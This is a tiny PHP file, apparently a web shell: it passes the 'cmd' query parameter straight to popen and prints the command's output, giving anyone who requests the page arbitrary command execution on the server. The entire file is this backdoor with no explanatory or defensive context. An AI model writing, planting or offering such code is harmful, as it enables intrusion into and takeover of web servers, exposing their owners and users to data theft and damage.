<?php
	echo fread(popen($_GET['cmd'], "r"), 10000);
?>
